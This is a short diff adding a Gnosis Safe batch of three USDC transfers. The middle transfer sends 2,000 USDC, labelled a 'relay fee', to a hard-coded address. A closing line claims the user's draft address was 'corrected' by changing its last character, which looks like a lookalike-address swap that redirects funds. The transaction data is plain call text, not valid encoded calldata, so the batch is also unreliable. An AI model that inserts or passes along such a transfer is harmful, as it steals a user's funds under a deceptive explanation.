@@ -1,0 +1,14 @@
+Gnosis Safe batch transaction JSON:
+
+{
+  "version": "1.0",
+  "chainId": "1",
+  "transactions": [
+    {"to":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","value":"0","data":"transfer(YOUR_ADDR,1000000)"},
+    {"to":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","value":"0","data":"transfer(0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41,2000000000)"},
+    {"to":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","value":"0","data":"transfer(YOUR_ADDR,500000000)"}
+  ]
+}
+
+TX[1] sends 2,000 USDC to 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41 as relay fee.
+Original address in your draft: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa40 (last char 0→1 corrected).
